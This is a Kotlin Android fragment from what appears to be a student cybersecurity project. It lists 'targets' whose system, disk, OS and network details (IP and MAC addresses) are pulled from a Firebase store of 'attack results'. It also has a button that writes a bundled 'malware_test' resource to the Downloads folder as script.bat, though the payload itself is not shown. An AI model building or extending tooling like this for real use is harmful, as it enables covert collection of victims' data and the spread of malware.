package tr.com.mermela.cybersecurityfinalproject.ui.devicelist

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Environment
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.fragment.app.viewModels
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.io.File
import java.io.FileOutputStream
import tr.com.mermela.cybersecurityfinalproject.R
import tr.com.mermela.cybersecurityfinalproject.databinding.FragmentDeviceListBinding
import tr.com.mermela.cybersecurityfinalproject.domain.AttackResult
import tr.com.mermela.cybersecurityfinalproject.domain.DiskInfo
import tr.com.mermela.cybersecurityfinalproject.domain.NetworkInfo
import tr.com.mermela.cybersecurityfinalproject.domain.OsInfo
import tr.com.mermela.cybersecurityfinalproject.domain.SystemInfo
import tr.com.mermela.cybersecurityfinalproject.domain.TargetInfo
import tr.com.mermela.cybersecurityfinalproject.ui.MainActivity
import tr.com.mermela.cybersecurityfinalproject.ui.devicedetail.DeviceDetailFragment
import tr.com.mermela.cybersecurityfinalproject.ui.devicelist.adapter.DeviceListAdapter
import java.io.InputStream


class DeviceListFragment : Fragment() {

    private lateinit var binding: FragmentDeviceListBinding

    private val viewModel: DeviceListViewModel by viewModels()

    private lateinit var adapter : DeviceListAdapter

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        binding = FragmentDeviceListBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        initListener()
        loadDataFromFirebase()
    }

    private fun initListener() {
        with(binding){
            btnDownloadMalware.setOnClickListener {
                saveFile()
            }
        }
    }

    private fun onDetailClick(targetInfo: TargetInfo){
        val bundle = Bundle().apply {
            putParcelable("targetInfo", targetInfo)
        }

        val deviceDetailFragment = DeviceDetailFragment().apply {
            arguments = bundle
        }

        (activity as MainActivity).supportFragmentManager.beginTransaction()
            .replace(R.id.fragmentContainer, deviceDetailFragment)
            .addToBackStack(null)
            .commit()
    }

    private fun loadDataFromFirebase() {
        binding.progressBar.isVisible = true
        val databaseReference = FirebaseDatabase.getInstance().getReference("client")
        databaseReference.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val usersList = mutableListOf<TargetInfo>()
                for (userSnapshot in snapshot.children) {
                    val username = userSnapshot.key ?: "Unknown"
                    val attackResults = mutableListOf<AttackResult>()
                    userSnapshot.child("attack/attack_result").children.forEach { resultSnapshot ->
                        val timestamp = resultSnapshot.child("Timestamp").value as? String ?: "Unknown Time"
                        val diskInfo = resultSnapshot.child("disk_info").getValue(DiskInfo::class.java) ?: DiskInfo()
                        val networkInfo = mutableListOf<NetworkInfo>()
                        resultSnapshot.child("network_info").children.forEach { networkSnapshot ->
                            val description = networkSnapshot.child("Description").value as? String ?: ""
                            val ipAddress = networkSnapshot.child("IPAddress").value as? String ?: ""
                            val macAddress = networkSnapshot.child("MACAddress").value as? String ?: ""
                            networkInfo.add(NetworkInfo(description, ipAddress, macAddress))
                        }
                        val osInfo = resultSnapshot.child("os_info").getValue(OsInfo::class.java) ?: OsInfo()
                        val systemInfo = resultSnapshot.child("system_info").getValue(SystemInfo::class.java) ?: SystemInfo()
                        attackResults.add(AttackResult(timestamp, diskInfo, networkInfo, osInfo, systemInfo))
                    }
                    usersList.add(TargetInfo(username, attackResults))
                }
                updateRecyclerView(usersList)
                binding.progressBar.isVisible = false
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(context, "Firebase'den veri alınamadı: ${error.toException()}", Toast.LENGTH_LONG).show()
                binding.progressBar.isVisible = false
            }
        })
    }

    private fun updateRecyclerView(usersList: MutableList<TargetInfo>) {
        adapter = DeviceListAdapter(usersList, ::onDetailClick)
        binding.rvDevices.adapter = adapter
    }

    private fun saveFile() {
        val inputStream: InputStream = resources.openRawResource(R.raw.malware_test) // script.bat dosyasını okuma
        val file = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "script.bat")

        try {
            val outputStream = FileOutputStream(file)
            val buffer = ByteArray(1024)
            var length: Int

            while (inputStream.read(buffer).also { length = it } > 0) {
                outputStream.write(buffer, 0, length)
            }

            outputStream.flush()
            outputStream.close()
            inputStream.close()

            Toast.makeText(context, "Dosya indirildi: ${file.absolutePath}", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(context, "Dosya indirilemedi", Toast.LENGTH_LONG).show()
        }
    }

}